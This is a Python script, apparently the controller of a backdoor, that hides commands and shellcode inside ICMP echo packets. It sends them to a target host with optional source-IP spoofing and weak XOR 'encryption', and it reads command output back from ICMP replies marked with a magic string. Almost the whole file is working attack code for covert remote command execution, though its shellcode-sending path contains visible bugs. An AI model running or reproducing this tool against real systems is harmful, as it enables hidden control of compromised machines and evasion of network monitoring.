from scapy.all import *
import _thread
import getopt
import struct

MSG_TYPE_SHELLCODE = '\x01'
MSG_TYPE_COMMAND = '\x02'
MSG_TYPE_REMOTE_SHELLCODE = '\x03'

magic = b"GOATSE"
src_ip = ""
dst_ip = ""
shellcode_file = ""
block_size = 128
interface=None

########## functions ############
def usage(err=None):
    if err:
        print("Error: {}\n".format(err))

    print("Usage:")
    print("\tpython {} -d <dst_ip> -i <interface> [-s <src_ip>] [-f <shellcode_file>] [-h]".format(sys.argv[0]))
    print("\t\tinterface: The interface that should be used for sending packets. (REQUIRED)")
    print("\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)")
    print("\t\tsrc_ip: the address we want to send from (Can be anything)")
    print("\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin")
    print()
    sys.exit(0)

def parse_args():
   global dst_ip, src_ip, shellcode_file, interface

   try:
      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:h', \
         ['interface=', 'destination=', 'source=', 'shellcode=', 'help'])

   except getopt.GetoptError as err:
      usage(err)    

   for o, a in opts:
      if o in ('-d', '--destination'):
         dst_ip = a
      if o in ('-i', '--interface'):
         interface = a
      if o in ('-s', '--source'):
         src_ip = a
      if o in ('-f', '--shellcode'):
         shellcode_file = a
      if o in ('-h', '--help'):
         usage()

def generate_key(len=64):
    global block_size

    return bytes([(random.randint(0, 255)) for _ in range(block_size)])


def crypt_data(data, key):
    global block_size

    if len(data) % block_size:
        data += (b"\x00" * (block_size - (len(data) % block_size)))

    j = 0
    output = []

    for i in range(len(data)):
        output.append(data[i] ^ key[j])

        if j > 0 and (j % (block_size - 1) == 0):
            j = 0
        else:
            j += 1

    return bytes(output)


def build_pkt(src, dst, data):
    ip = IP(dst=dst)

    if src_ip:
        ip.src = src

    return ip/ICMP(type=8, code=0, id=random.randint(0, 65535))/data

def sniff_packet(pkt):
    global magic, block_size

    if ICMP in pkt and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
        if len(pkt.load) > 0 and (len(pkt.load) % block_size == 0):
            data = crypt_data(pkt.load[block_size:], pkt.load[:block_size])

            if data.startswith(magic):
                if data[6] == 0x00:
                    print(data[len(magic) + 3:].decode(), end='')

def start_listener():
    global interface

    sniff(filter="icmp", prn=sniff_packet, iface=interface)

def send_shellcode():
   global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, shellcode_file, last_packet
   shellcode = magic + MSG_TYPE_SHELLCODE
      
   # Open and read the shellcode
   if shellcode_file == '-':
      shellcode += sys.stdin.read()
   else:
      f = open(shellcode_file, 'r')
      shellcode += f.read()
      f.close()

   # Get the required crypto bits
   key = generate_key()
   encrypted_data = crypt_data(shellcode, key)
   last_packet = encrypted_data

   # Now send it
   send(build_pkt(src_ip, dst_ip, encrypted_data, key), verbose=0)

# We need use rand for key generation
random.seed()

# Parse the arguments
parse_args()

# Make sure we at least have a destination
if not dst_ip:
   print("ERROR: Destination must be specified")
   usage()
   sys.exit(0)
   
# Make sure we at least have a destination
if not interface:
   print("ERROR: Interface must be specified")
   usage()
   sys.exit(0)
 
# Do we send shellcode or start a shell
if shellcode_file != "":
	send_shellcode()
	print("Shellcode sent")
	sys.exit(0)

# Create the listener thread
_thread.start_new_thread(start_listener, ())

# Now just read our input and send commands
while 1:
   line = sys.stdin.readline().rstrip('\n').encode()
   key = generate_key()
   encrypted_data = crypt_data(magic + b"\x02" + struct.pack('<H', len(line)) + line, key)
   send(build_pkt(src_ip, dst_ip, key + encrypted_data), verbose=0, iface=interface)
